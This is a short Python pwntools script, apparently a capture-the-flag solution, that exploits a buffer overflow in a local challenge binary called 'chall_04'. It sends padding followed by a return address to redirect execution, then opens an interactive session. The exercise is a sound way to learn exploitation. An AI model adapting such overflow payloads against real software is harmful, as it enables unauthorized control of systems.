from pwn import *
def main():
	p = process("./chall_04")
	print(p.recv())
	p.sendline()
	payload = (chr(int("00", 16))* (72 - 16)).encode() + p64(0x004005b7)
	print(payload)
	p.sendline(payload)
	p.interactive()
main()
